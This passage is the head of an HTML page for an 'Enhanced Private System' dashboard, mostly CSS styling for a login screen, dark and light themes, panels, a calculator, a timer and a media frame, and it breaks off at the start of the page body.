<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Enhanced Private System</title>
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto:wght@300;400;500;700&display=swap');

:root {
--primary-bg: #0a0a0a;
--secondary-bg: #1a1a1a;
--accent-color: #ff4500;
--accent-secondary: #ff6b35;
--text-primary: #ffffff;
--text-secondary: #cccccc;
--border-color: #333;
--success-color: #00ff41;
--warning-color: #ffaa00;
--error-color: #ff0040;

/* Specific colors for content indicators */
--color-high: #00ff41; /* Green */
--color-medium: #ffaa00; /* Orange */
--color-low: #ff0040; /* Red */
--color-yes: #00ff41; /* Green */
--color-no: #ff0040; /* Red */
--color-rare: #ffaa00; /* Orange */
--color-rarely: #ffaa00; /* Orange */
--color-unknown: #aaaaaa; /* Grey */
--color-dangerous: #ff0040; /* Red */
}

body.light-theme {
--primary-bg: #f0f2f5;
--secondary-bg: #ffffff;
--accent-color: #007bff;
--accent-secondary: #0056b3;
--text-primary: #333333;
--text-secondary: #666666;
--border-color: #e0e0e0;
--success-color: #28a745;
--warning-color: #ffc107;
--error-color: #dc3545;

/* Specific colors for content indicators - light theme */
--color-high: #28a745;
--color-medium: #ffc107;
--color-low: #dc3545;
--color-yes: #28a745;
--color-no: #dc3545;
--color-rare: #ffc107;
--color-rarely: #ffc107;
--color-unknown: #6c757d;
--color-dangerous: #dc3545;
}

body.light-theme .login-box {
background: rgba(255, 255, 255, 0.95);
border: 3px solid var(--accent-color);
box-shadow: 0 0 30px rgba(0, 123, 255, 0.3);
}
body.light-theme .login-box h2 {
background: linear-gradient(45deg, var(--accent-color), #333);
-webkit-background-clip: text;
-webkit-text-fill-color: transparent;
}
body.light-theme .login-box input {
background: rgba(240, 240, 240, 0.8);
border: 2px solid var(--border-color);
color: #333;
}
body.light-theme .toggle-container span, body.light-theme .time-date-box .date-display {
color: var(--text-primary);
}
body.light-theme .dashboard-header {
background: linear-gradient(135deg, var(--accent-color), var(--accent-secondary));
color: white;
}
body.light-theme .quick-btn {
background: var(--accent-color);
color: white;
}
body.light-theme .quick-btn:hover {
background: var(--accent-secondary);
}
body.light-theme .dashboard-quickbar {
background: var(--secondary-bg);
border-color: var(--border-color);
}
body.light-theme .search-bar {
background: var(--primary-bg);
border-color: var(--border-color);
color: var(--text-primary);
}
body.light-theme .search-btn {
background: var(--accent-color);
}
body.light-theme .search-btn:hover {
background: var(--accent-secondary);
}
body.light-theme .quickbar-time-info {
background-color: var(--primary-bg);
border-color: var(--border-color);
color: var(--text-primary);
}
body.light-theme .panels-grid {
border: none;
}
body.light-theme .panel {
background: var(--secondary-bg);
border: 1px solid var(--border-color);
color: var(--text-primary);
}
body.light-theme .panel-title {
color: var(--accent-color);
}
body.light-theme .panel-controls .panel-btn {
background: var(--secondary-bg);
border-color: var(--border-color);
color: var(--text-secondary);
}
body.light-theme .panel-controls .panel-btn:hover {
background: var(--accent-color);
color: white;
}
body.light-theme .calendar-cell {
background: var(--primary-bg);
color: var(--text-primary);
}
body.light-theme .calendar-cell:hover, body.light-theme .calendar-cell.today {
background: var(--accent-color);
color: white;
}
body.light-theme .log-entry {
background: var(--primary-bg);
border-left-color: var(--accent-color);
color: var(--text-primary);
}
body.light-theme .log-time {
color: var(--text-secondary);
}
body.light-theme .login-entry-container {
background-color: var(--primary-bg);
}
body.light-theme .login-entry-container.success {
border-left: 4px solid var(--success-color);
background-color: var(--primary-bg);
}
body.light-theme .login-entry-container.failed {
border-left: 4px solid var(--error-color);
background-color: var(--primary-bg);
}
body.light-theme .error-log-entry.error {
border-left: 4px solid var(--error-color);
background-color: var(--primary-bg);
color: var(--text-primary);
}

body.light-theme .system-update-item {
background-color: var(--primary-bg);
border-left: 4px solid var(--accent-secondary);
color: var(--text-primary);
transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease;
}

body.light-theme .notification {
position: fixed;
top: 20px;
right: 20px;
background: var(--secondary-bg);
border: 2px solid var(--success-color);
color: var(--text-primary);
padding: 15px 25px;
border-radius: 10px;
box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
z-index: 1000;
animation: slideIn 0.5s ease;
}

body.light-theme .settings-content {
background: var(--secondary-bg);
border-color: var(--accent-color);
color: var(--text-primary);
}
body.light-theme .settings-content h2, body.light-theme .settings-content h3 {
color: var(--accent-color);
}
body.light-theme .setting-item {
background: var(--primary-bg);
border-color: var(--border-color);
}
body.light-theme .tool-btn, body.light-theme .timer-controls .tool-btn {
background: var(--accent-color);
color: white;
}
body.light-theme .tool-btn:hover, body.light-theme .tool-btn.active, body.light-theme .timer-controls .tool-btn:hover {
background: var(--accent-secondary);
}
body.light-theme #drawingCanvas {
background: #f0f0f0;
}
body.light-theme #textNotes {
background: var(--primary-bg);
color: var(--text-primary);
}
body.light-theme .calculator {
background: var(--primary-bg);
}
body.light-theme .calc-display {
background: var(--secondary-bg);
border-color: var(--border-color);
color: var(--accent-color);
}
body.light-theme .calc-buttons {
border-color: var(--border-color);
}
body.light-theme .calc-btn {
background: var(--secondary-bg);
color: var(--text-primary);
}
body.light-theme .calc-btn:hover {
background: var(--accent-color);
}
body.light-theme .calc-btn.operator {
background: var(--accent-color);
}
body.light-theme .calc-btn.equals {
background: var(--success-color);
color: black;
}
body.light-theme .media-input {
background: var(--secondary-bg);
border-color: var(--border-color);
color: var(--text-primary);
}
body.light-theme .media-frame {
background: var(--secondary-bg);
}
body.light-theme .stat-item {
background: var(--primary-bg);
border-color: var(--border-color);
}
body.light-theme .keybind-input {
background: var(--secondary-bg);
border-color: var(--border-color);
color: var(--text-primary);
}
body.light-theme .important-date-input,
body.light-theme .important-date-event-input,
body.light-theme .important-date-item,
body.light-theme #randomFact,
body.light-theme #dailyQuote,
body.light-theme .error-log-entry,
body.light-theme .announcement-bar,
body.light-theme .reset-popup .reset-field,
body.light-theme .feature-button-group button,
body.light-theme .sub-feature-button,
body.light-theme .formatted-info-card
{
background-color: var(--primary-bg) !important;
color: var(--text-primary) !important;
border-color: var(--border-color) !important;
}
body.light-theme .important-date-item {
border-left-color: var(--accent-secondary) !important;
}
body.light-theme .click-button,
body.light-theme .reset-popup button,
body.light-theme .feature-button-group button,
body.light-theme .sub-feature-button
{
background: var(--accent-color) !important;
color: white !important;
}
body.light-theme .click-button:hover,
body.light-theme .reset-popup button:hover,
body.light-theme .feature-button-group button:hover,
body.light-theme .sub-feature-button:hover
{
background: var(--accent-secondary) !important;
transform: translateY(-2px);
box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
}
body.light-theme .announcement-content {
color: var(--accent-color) !important;
}
body.light-theme .reset-popup {
background: rgba(255, 255, 255, 0.98) !important;
border-color: var(--accent-color) !important;
box-shadow: 0 0 30px rgba(0, 123, 255, 0.3) !important;
}
body.light-theme .reset-popup p {
color: var(--text-primary) !important;
}

body.light-theme .text-color-high { color: var(--color-high); }
body.light-theme .text-color-medium { color: var(--color-medium); }
body.light-theme .text-color-low { color: var(--color-low); }
body.light-theme .text-color-yes { color: var(--color-yes); }
body.light-theme .text-color-no { color: var(--color-no); }
body.light-theme .text-color-rare { color: var(--color-rare); }
body.light-theme .text-color-rarely { color: var(--color-rarely); }
body.light-theme .text-color-unknown { color: var(--color-unknown); }
body.light-theme .text-color-dangerous { color: var(--color-dangerous); }


* {
box-sizing: border-box;
margin: 0;
padding: 0;
}

body {
font-family: 'Roboto', sans-serif;
background: var(--primary-bg);
color: var(--text-primary);
overflow-x: hidden;
transition: background-color 0.3s ease, color 0.3s ease;
}

.init-screen {
position: fixed;
top: 0;
left: 0;
width: 100vw;
height: 100vh;
background: radial-gradient(circle at center, #1a1a2e, #16213e, #0f0f0f);
display: flex;
flex-direction: column;
justify-content: center;
align-items: center;
z-index: 9999;
}

.rotating-cube {
width: 80px;
height: 80px;
position: relative;
transform-style: preserve-3d;
animation: rotateCube 2s infinite linear;
margin-bottom: 30px;
}

.cube-face {
position: absolute;
width: 80px;
height: 80px;
background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
border: 2px solid #fff;
opacity: 0.8;
}

.cube-face.front { transform: rotateY(0deg) translateZ(40px); }
.cube-face.back { transform: rotateY(180deg) translateZ(40px); }
.cube-face.right { transform: rotateY(90deg) translateZ(40px); }
.cube-face.left { transform: rotateY(-90deg) translateZ(40px); }
.cube-face.top { transform: rotateX(90deg) translateZ(40px); }
.cube-face.bottom { transform: rotateX(-90deg) translateZ(40px); }

@keyframes rotateCube {
0% { transform: rotateX(0deg) rotateY(0deg); }
100% { transform: rotateX(360deg) rotateY(360deg); }
}

.init-text {
font-family: 'Orbitron', monospace;
font-size: 24px;
font-weight: 700;
background: linear-gradient(45deg, #ff4500, #ff0040);
background-size: 200% 200%;
-webkit-background-clip: text;
-webkit-text-fill-color: transparent;
animation: gradientShift 3s ease-in-out infinite;
text-align: center;
}

@keyframes gradientShift {
0%, 100% { background-position: 0% 50%; }
50% { background-position: 100% 50%; }
}

.code-rain {
position: absolute;
top: 0;
left: 0;
width: 100%;
height: 100%;
pointer-events: none;
opacity: 0.3;
}

.code-char {
position: absolute;
color: var(--success-color);
font-family: 'Courier New', monospace;
font-size: 12px;
animation: fall 3s linear infinite;
}

@keyframes fall {
0% { transform: translateY(-100vh); opacity: 1; }
100% { transform: translateY(100vh); opacity: 0; }
}

.login-container {
min-height: 100vh;
background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
display: flex;
flex-direction: column;
justify-content: center;
align-items: center;
position: relative;
}

.login-quickbar {
position: fixed;
top: 0;
left: 0;
right: 0;
background: rgba(0, 0, 0, 0.9);
backdrop-filter: blur(10px);
padding: 10px 20px;
display: flex;
justify-content: space-between;
align-items: center;
z-index: 1000;
border-bottom: 1px solid var(--border-color);
}

.login-quickbar button {
background: var(--accent-color);
color: white;
border: none;
padding: 8px 15px;
border-radius: 6px;
cursor: pointer;
font-size: 12px;
transition: all 0.3s ease;
margin: 0 5px;
}

.login-quickbar button:hover {
background: var(--accent-secondary);
transform: translateY(-2px);
}

.panic-btn {
background: var(--error-color) !important;
}

.login-box {
background: rgba(26, 26, 26, 0.95);
backdrop-filter: blur(15px);
border: 3px solid var(--accent-color);
border-radius: 20px;
box-shadow: 0 0 30px rgba(255, 69, 0, 0.5);
width: 420px;
padding: 40px 30px;
text-align: center;
position: relative;
margin-top: 60px;
transition: all 0.3s ease;
}

.login-box.error-shake {
animation: shake 0.5s ease-in-out;
}

@keyframes shake {
0%, 100% { transform: translateX(0); }
25% { transform: translateX(-10px); }
75% { transform: translateX(10px); }
}

.login-box h2 {
font-family: 'Orbitron', monospace;
font-size: 28px;
font-weight: 900;
margin-bottom: 30px;
background: linear-gradient(45deg, var(--accent-color), #fff);
-webkit-background-clip: text;
-webkit-text-fill-color: transparent;
}

.input-group {
position: relative;
margin-bottom: 20px;
}

.login-box input {
width: 100%;
padding: 15px;
background: rgba(30, 30, 30, 0.8);
border: 2px solid var(--border-color);
color: white;
border-radius: 10px;
font-size: 16px;
transition: all 0.3s ease;
}

.login-box input:focus {
border-color: var(--accent-color);
box-shadow: 0 0 15px rgba(255, 69, 0, 0.3);
outline: none;
}

.toggle-container {
display: flex;
align-items: center;
justify-content: space-between;
margin: 15px 0;
padding: 10px;
background: rgba(30, 30, 30, 0.5);
border-radius: 10px;
}

.toggle-switch {
position: relative;
width: 50px;
height: 25px;
background: #333;
border-radius: 25px;
cursor: pointer;
transition: all 0.3s ease;
}

.toggle-switch.active {
background: var(--success-color);
}

.toggle-slider {
position: absolute;
top: 2px;
left: 2px;
width: 21px;
height: 21px;
background: white;
border-radius: 50%;
transition: all 0.3s ease;
}

.toggle-switch.active .toggle-slider {
transform: translateX(25px);
}

.submit-btn {
width: 100%;
padding: 15px;
background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
color: white;
font-size: 18px;
font-weight: 700;
border: none;
border-radius: 10px;
cursor: pointer;
transition: all 0.3s ease;
text-transform: uppercase;
letter-spacing: 1px;
}

.submit-btn:hover {
transform: translateY(-2px);
box-shadow: 0 5px 15px rgba(255, 69, 0, 0.4);
}

.time-date-box {
background: rgba(30, 30, 30, 0.8);
border: 2px solid var(--border-color);
border-radius: 15px;
padding: 20px;
margin-top: 20px;
text-align: center;
}

.time-display {
font-family: 'Orbitron', monospace;
font-size: 24px;
font-weight: 700;
color: var(--accent-color);
margin-bottom: 10px;
}

.date-display {
font-size: 16px;
color: var(--text-secondary);
}

.dashboard {
min-height: 100vh;
background: var(--primary-bg);
padding: 20px;
display: none;
}

.dashboard.active {
display: block;
}

.dashboard-header {
background: linear-gradient(135deg, var(--accent-color), var(--accent-secondary));
padding: 20px 30px;
border-radius: 15px;
margin-bottom: 20px;
display: flex;
justify-content: space-between;
align-items: center;
color: white;
}

.dashboard-quickbar {
display: flex;
flex-wrap: wrap;
justify-content: space-between;
gap: 10px;
margin-bottom: 20px;
padding: 15px;
background: var(--secondary-bg);
border-radius: 15px;
border: 1px solid var(--border-color);
align-items: center;
}

.quickbar-time-info {
display: flex;
align-items: center;
gap: 5px;
font-size: 12px;
white-space: nowrap;
background-color: var(--primary-bg);
padding: 6px 10px;
border-radius: 6px;
border: 1px solid var(--border-color);
color: var(--text-primary);
}
.quickbar-time-value {
font-family: 'Orbitron', monospace;
color: var(--accent-color);
font-weight: bold;
font-size: 13px;
}

.search-group {
display: flex;
align-items: center;
gap: 10px;
flex-grow: 1;
max-width: 50%;
min-width: 350px;
}
.search-container {
position: relative;
display: flex;
flex-grow: 1;
max-width: 300px;
}

.search-bar {
width: 100%;
padding: 10px 40px 10px 15px;
background: var(--primary-bg);
border: 2px solid var(--border-color);
border-radius: 25px;
color: white;
font-size: 14px;
flex-grow: 1;
}

.search-btn {
position: absolute;
right: 5px;
top: 50%;
transform: translateY(-50%);
background: var(--accent-color);
border: none;
border-radius: 50%;
width: 30px;
height: 30px;
color: white;
cursor: pointer;
transition: all 0.3s ease;
}
.search-btn:hover {
background: var(--accent-secondary);
}

.quick-btn-group {
display: flex;
flex-wrap: wrap;
gap: 10px;
justify-content: flex-end;
}

.quick-btn {
background: var(--accent-color);
color: white;
border: none;
padding: 10px 15px;
border-radius: 8px;
cursor: pointer;
font-size: 12px;
transition: all 0.3s ease;
white-space: nowrap;
}

.quick-btn:hover {
background: var(--accent-secondary);
transform: translateY(-2px);
}

.notification {
position: fixed;
top: 20px;
right: 20px;
background: var(--secondary-bg);
border: 2px solid var(--success-color);
color: var(--text-primary);
padding: 15px 25px;
border-radius: 10px;
box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
z-index: 1000;
animation: slideIn 0.5s ease;
}

@keyframes slideIn {
from { transform: translateX(100%); opacity: 0; }
to { transform: translateX(0); opacity: 1; }
}

.panels-grid {
display: grid;
grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
gap: 20px;
margin-bottom: 30px;
transition: opacity 0.3s ease-in-out;
}

.panel {
background: var(--secondary-bg);
border: 1px solid var(--border-color);
border-radius: 15px;
padding: 20px;
position: relative;
transition: all 0.3s ease;
resize: both;
overflow: auto;
min-height: 200px;
}

.panel:hover {
box-shadow: 0 5px 20px rgba(255, 69, 0, 0.2);
}

.panel-header {
display: flex;
justify-content: space-between;
align-items: center;
margin-bottom: 15px;
padding-bottom: 10px;
border-bottom: 1px solid var(--border-color);
}

.panel-title {
font-size: 18px;
font-weight: 700;
color: var(--accent-color);
}

.panel-controls {
display: flex;
gap: 5px;
}

.panel-btn {
background: none;
border: 1px solid var(--border-color);
color: var(--text-secondary);
border-radius: 4px;
width: 25px;
height: 25px;
cursor: pointer;
font-size: 10px;
transition: all 0.3s ease;
}

.panel-btn:hover {
background: var(--accent-color);
color: white;
}

.calendar-grid {
display: grid;
grid-template-columns: repeat(7, 1fr);
gap: 5px;
margin-top: 15px;
}

.calendar-cell {
aspect-ratio: 1;
display: flex;
align-items: center;
justify-content: center;
background: var(--primary-bg);
border-radius: 6px;
cursor: pointer;
transition: all 0.3s ease;
font-size: 12px;
}

.calendar-cell:hover {
background: var(--accent-color);
}

.calendar-cell.today {
background: var(--accent-color);
color: white;
font-weight: bold;
}

.login-entry-container {
display: flex;
justify-content: space-between;
align-items: center;
padding: 10px;
margin-bottom: 5px;
border-radius: 6px;
font-size: 12px;
border: 1px solid var(--border-color);
background-color: var(--primary-bg);
transition: background-color 0.3s ease;
}
.login-entry-container.success {
border-left: 4px solid var(--success-color);
background-color: var(--primary-bg);
}
.login-entry-container.failed {
border-left: 4px solid var(--error-color);
background-color: var(--primary-bg);
}
.login-entry-status {
font-weight: bold;
color: var(--text-primary);
}
.login-entry-time {
color: var(--text-secondary);
font-size: 10px;
}

.important-date-input, .important-date-event-input {
width: 100%;
padding: 8px 10px;
margin-bottom: 8px;
border-radius: 6px;
border: 1px solid var(--border-color);
background-color: var(--primary-bg);
color: var(--text-primary);
font-size: 14px;
transition: border-color 0.3s ease;
}
.important-date-input:focus, .important-date-event-input:focus {
outline: none;
border-color: var(--accent-color);
}
.important-date-item {
padding: 8px 10px;
margin-bottom: 8px;
border-radius: 6px;
background-color: var(--primary-bg);
border-left: 4px solid var(--accent-secondary);
color: var(--text-primary);
font-size: 13px;
display: flex;
flex-direction: column;
gap: 2px;
}
.important-date-item .date-time {
font-weight: bold;
color: var(--accent-color);
}
.important-date-item .event-description {
color: var(--text-secondary);
}

.system-update-item {
padding: 8px;
border-radius: 6px;
margin-bottom: 8px;
font-size: 12px;
background-color: var(--primary-bg);
border-left: 4px solid var(--accent-secondary);
color: var(--text-primary);
transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease;
}

.settings-modal {
position: fixed;
top: 0;
left: 0;
width: 100vw;
height: 100vh;
background: rgba(0, 0, 0, 0.8);
display: none;
justify-content: center;
align-items: center;
z-index: 2000;
}

.settings-content {
background: var(--secondary-bg);
border: 2px solid var(--accent-color);
border-radius: 20px;
padding: 30px;
width: 90%;
max-width: 800px;
max-height: 90vh;
overflow-y: auto;
}

.settings-grid {
display: grid;
grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
gap: 20px;
margin-top: 20px;
}

.setting-item {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px;
background: var(--primary-bg);
border-radius: 10px;
border: 1px solid var(--border-color);
}

.drawing-tools {
display: flex;
flex-wrap: wrap;
gap: 10px;
margin-top: 15px;
padding: 15px;
background: var(--primary-bg);
border-radius: 10px;
}

.tool-btn {
padding: 8px 12px;
background: var(--accent-color);
color: white;
border: none;
border-radius: 6px;
cursor: pointer;
font-size: 12px;
transition: all 0.3s ease;
}

.tool-btn:hover, .tool-btn.active {
background: var(--accent-secondary);
transform: scale(1.05);
}

.color-picker {
width: 30px;
height: 30px;
border: none;
border-radius: 6px;
cursor: pointer;
}

.thickness-slider {
width: 100px;
accent-color: var(--accent-color);
}

.timer-display {
font-family: 'Orbitron', monospace;
font-size: 36px;
font-weight: 700;
color: var(--accent-color);
text-align: center;
margin: 20px 0;
}

.timer-controls {
display: flex;
justify-content: center;
gap: 10px;
margin-top: 15px;
}

.log-entry {
padding: 10px;
background: var(--primary-bg);
border-left: 4px solid var(--accent-color);
margin-bottom: 10px;
border-radius: 6px;
font-size: 12px;
display: flex;
justify-content: space-between;
}

.log-time {
color: var(--text-secondary);
font-size: 10px;
}

.error-log-entry {
padding: 10px;
background: var(--primary-bg);
border-left: 4px solid var(--error-color);
margin-bottom: 10px;
border-radius: 6px;
font-size: 12px;
display: flex;
justify-content: space-between;
color: var(--text-primary);
}
.error-log-time {
color: var(--text-secondary);
font-size: 10px;
}

.stats-grid {
display: grid;
grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
gap: 15px;
margin-top: 15px;
}

.stat-item {
text-align: center;
padding: 15px;
background: var(--primary-bg);
border-radius: 10px;
border: 1px solid var(--border-color);
}

.stat-number {
font-family: 'Orbitron', monospace;
font-size: 24px;
font-weight: 700;
color: var(--accent-color);
}

.stat-label {
font-size: 12px;
color: var(--text-secondary);
margin-top: 5px;
}

.theme-selector {
display: grid;
grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
gap: 10px;
margin-top: 15px;
}

.theme-option {
aspect-ratio: 1;
border-radius: 10px;
cursor: pointer;
border: 3px solid transparent;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
font-size: 12px;
font-weight: bold;
}

.theme-option:hover, .theme-option.active {
border-color: var(--accent-color);
transform: scale(1.05);
}

.calculator {
background: var(--primary-bg);
border-radius: 15px;
padding: 20px;
margin-top: 15px;
}

.calc-display {
background: var(--secondary-bg);
border: 1px solid var(--border-color);
border-radius: 8px;
padding: 15px;
text-align: right;
font-family: 'Orbitron', monospace;
font-size: 24px;
color: var(--accent-color);
margin-bottom: 15px;
min-height: 60px;
}

.calc-buttons {
display: grid;
grid-template-columns: repeat(4, 1fr);
gap: 10px;
}

.calc-btn {
aspect-ratio: 1;
border: none;
border-radius: 8px;
background: var(--secondary-bg);
color: white;
font-size: 18px;
font-weight: bold;
cursor: pointer;
transition: all 0.3s ease;
}

.calc-btn:hover {
background: var(--accent-color);
}

.calc-btn.operator {
background: var(--accent-color);
}

.calc-btn.equals {
background: var(--success-color);
color: black;
}

.media-container {
background: var(--primary-bg);
border-radius: 15px;
padding: 20px;
margin-top: 15px;
}

.media-input {
width: 100%;
padding: 10px;
background: var(--secondary-bg);
border: 1px solid var(--border-color);
border-radius: 8px;
color: white;
margin-bottom: 15px;
}

.media-frame {
width: 100%;
height: 400px;
border: 1px solid var(--border-color);
border-radius: 8px;
background: var(--secondary-bg);
}

.keybind-item {
display: flex;
justify-content: space-between;
align-items: center;
padding: 10px;
background: var(--primary-bg);
border-radius: 8px;
margin-bottom: 10px;
}

.keybind-input {
background: var(--secondary-bg);
border: 1px solid var(--border-color);
border-radius: 4px;
padding: 5px 10px;
color: white;
font-family: 'Courier New', monospace;
}

.click-button {
width: 100%;
padding: 15px;
background: var(--accent-color);
color: white;
font-size: 18px;
font-weight: 700;
border: none;
border-radius: 10px;
cursor: pointer;
transition: all 0.3s ease;
text-transform: uppercase;
letter-spacing: 1px;
margin-top: 10px;
}
.click-button:hover {
background: var(--accent-secondary);
transform: translateY(-2px);
box-shadow: 0 5px 15px rgba(var(--accent-color), 0.4);
}
.click-count-display {
font-family: 'Orbitron', monospace;
font-size: 48px;
font-weight: 900;
color: var(--accent-color);
text-align: center;
margin-bottom: 20px;
padding: 10px;
background-color: var(--primary-bg);
border-radius: 10px;
border: 1px solid var(--border-color);
}

#randomFact, #dailyQuote {
background-color: var(--primary-bg);
padding: 15px;
border-radius: 8px;
border: 1px solid var(--border-color);
line-height: 1.5;
font-style: italic;
color: var(--text-primary);
}

.announcement-bar {
background-color: var(--secondary-bg);
border: 1px solid var(--border-color);
border-radius: 10px;
padding: 10px 20px;
overflow: hidden;
margin-bottom: 20px;
position: relative;
}

.announcement-content {
white-space: nowrap;
display: inline-block;
padding-left: 100%;
color: var(--accent-color);
font-weight: bold;
animation: marquee 20s linear infinite;
}

@keyframes marquee {
0% { transform: translateX(0%); }
100% { transform: translateX(-100%); }
}

.reset-popup {
position: fixed;
top: 50%;
left: 50%;
transform: translate(-50%, -50%);
background: rgba(26, 26, 26, 0.98);
backdrop-filter: blur(10px);
border: 3px solid var(--accent-color);
border-radius: 15px;
padding: 30px;
text-align: center;
z-index: 1001;
box-shadow: 0 0 40px rgba(255, 69, 0, 0.6);
width: 350px;
max-width: 90%;
display: none;
}

.reset-popup p {
margin-bottom: 20px;
font-size: 1.1em;
color: var(--text-primary);
}

.reset-popup .reset-field {
width: 100%;
padding: 12px;
margin-bottom: 20px;
border-radius: 8px;
border: 2px solid var(--border-color);
background: var(--primary-bg);
color: var(--text-primary);
font-size: 16px;
text-align: center;
}

.reset-popup button {
width: 100%;
padding: 12px;
background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
color: white;
border: none;
border-radius: 8px;
cursor: pointer;
font-size: 16px;
font-weight: bold;
transition: all 0.3s ease;
}

.reset-popup button:hover {
transform: translateY(-2px);
box-shadow: 0 4px 12px rgba(255, 69, 0, 0.3);
}

.feature-hub-section {
    margin-top: 20px;
    margin-bottom: 30px;
    padding: 20px;
    background: var(--secondary-bg);
    border-radius: 15px;
    border: 1px solid var(--border-color);
    display: flex;
    flex-wrap: wrap;
    gap: 15px;
    justify-content: center;
}

.feature-button-group {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    width: 160px;
    height: 120px;
    justify-content: center;
    background: var(--primary-bg);
    border-radius: 10px;
    border: 1px solid var(--border-color);
    transition: all 0.3s ease;
    cursor: pointer;
}
.feature-button-group:hover {
    box-shadow: 0 5px 20px rgba(255, 69, 0, 0.2);
    transform: translateY(-3px);
}

.feature-button-group .icon-wrapper {
    font-size: 2.5em;
    margin-bottom: 8px;
    color: var(--accent-color);
    line-height: 1;
}
.feature-button-group .icon-wrapper.emoji {
    font-size: 2.2em;
}

.feature-button-group .button-label {
    display: block;
    width: 100%;
    padding: 8px 10px;
    background: var(--accent-color);
    color: white;
    border: none;
    border-radius: 6px;
    font-size: 14px;
    font-weight: 500;
    transition: all 0.3s ease;
    white-space: nowrap;
    text-align: center;
    pointer-events: none;
}

.feature-button-group .button-label:hover {
    background: var(--accent-secondary);
    transform: scale(1.02);
}

.sub-feature-button-container {
    display: flex;
    flex-wrap: wrap;
    gap: 10px;
    margin-bottom: 15px;
    justify-content: center;
}
.sub-feature-button {
    padding: 10px 15px;
    background: var(--accent-color);
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-size: 14px;
    transition: all 0.3s ease;
    flex-grow: 1;
    max-width: 250px;
    text-align: center;
    text-decoration: none;
}
.sub-feature-button:hover {
    background: var(--accent-secondary);
    transform: translateY(-1px);
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
}

.formatted-info-card {
    background-color: var(--primary-bg);
    border: 1px solid var(--border-color);
    border-radius: 10px;
    padding: 20px;
    margin-top: 20px;
    max-height: 400px;
    overflow-y: auto;
    font-family: 'Roboto', monospace;
    font-size: 14px;
    line-height: 1.6;
    animation: fadeIn 0.5s ease-out;
    display: none;
}
@keyframes fadeIn {
    from { opacity: 0; transform: translateY(10px); }
    to { opacity: 1; transform: translateY(0); }
}

.formatted-info-card strong {
    color: var(--accent-color);
    font-weight: bold;
    display: inline-block;
    min-width: 120px;
}
.formatted-info-card p {
    margin-bottom: 5px;
}
.formatted-info-card a {
    color: var(--success-color);
    text-decoration: underline;
}
.formatted-info-card a:hover {
    color: var(--accent-secondary);
}
.media-player-warning {
    color: var(--warning-color);
    border-color: var(--warning-color);
    background-color: rgba(255, 170, 0, 0.1) !important;
}

.text-color-high { color: var(--color-high); }
.text-color-medium { color: var(--color-medium); }
.text-color-low { color: var(--color-low); }
.text-color-yes { color: var(--color-yes); }
.text-color-no { color: var(--color-no); }
.text-color-rare { color: var(--color-rare); }
.text-color-rarely { color: var(--color-rarely); }
.text-color-unknown { color: var(--color-unknown); }
.text-color-dangerous { color: var(--color-dangerous); }

.go-back-button {
    margin-top: 20px;
    padding: 10px 20px;
    background: var(--accent-secondary);
    color: white;
    border: none;
    border-radius: 8px;
    cursor: pointer;
    font-size: 14px;
    transition: all 0.3s ease;
    display: none;
}
.go-back-button:hover {
    background: var(--accent-color);
    transform: translateY(-1px);
}

.calculator-view, .converter-view {
    display: none;
}


@media (max-width: 1200px) {
.dashboard-quickbar .search-group {
flex-direction: column;
max-width: 100%;
align-items: flex-start;
}
.dashboard-quickbar .quickbar-time-info {
width: 100%;
justify-content: space-between;
}
.quick-btn-group {
width: 100%;
justify-content: center;
}
.search-container {
max-width: 100%;
}
.feature-hub-section {
    justify-content: center;
}
.feature-button-group {
    width: 48%;
    height: 100px;
}
.feature-button-group .icon-wrapper {
    font-size: 2em;
}
.feature-button-group .button-label {
    font-size: 13px;
    padding: 6px 8px;
}
}
@media (max-width: 768px) {
.login-box {
width: 90%;
margin: 20px auto;
}

.panels-grid {
grid-template-columns: 1fr;
}

.dashboard-quickbar {
flex-direction: column;
gap: 10px;
}

.search-container {
max-width: 100%;
}
.feature-button-group {
    width: 100%;
    height: 90px;
}
.settings-content {
    padding: 20px;
    max-width: 95%;
}
}

.loading-cube {
width: 60px;
height: 60px;
position: relative;
transform-style: preserve-3d;
animation: loadingRotate 1.5s infinite linear;
}

.loading-face {
position: absolute;
width: 60px;
height: 60px;
background: linear-gradient(45deg, var(--accent-color), var(--accent-secondary));
border: 1px solid #fff;
opacity: 0.9;
}

.loading-face.front { transform: rotateY(0deg) translateZ(30px); }
.loading-face.back { transform: rotateY(180deg) translateZ(30px); }
.loading-face.right { transform: rotateY(90deg) translateZ(30px); }
.loading-face.left { transform: rotateY(-90deg) translateZ(30px); }
.cube-face.top { transform: rotateX(90deg) translateZ(30px); }
.cube-face.bottom { transform: rotateX(-90deg) translateZ(30px); }

@keyframes loadingRotate {
0% { transform: rotateX(0deg) rotateY(0deg); }
100% { transform: rotateX(360deg) rotateY(360deg); }
}

.hidden { display: none !important; }
</style>
</head>
<body>

<div id="initScreen" class="init-screen">
<div class="rotating-cube">
<div class="cube-face front"></div>
<div class="cube-face back"></div>
<div class="cube-face right"></div>
<div class="cube-face left"></div>
<div class="cube-face top"></div>
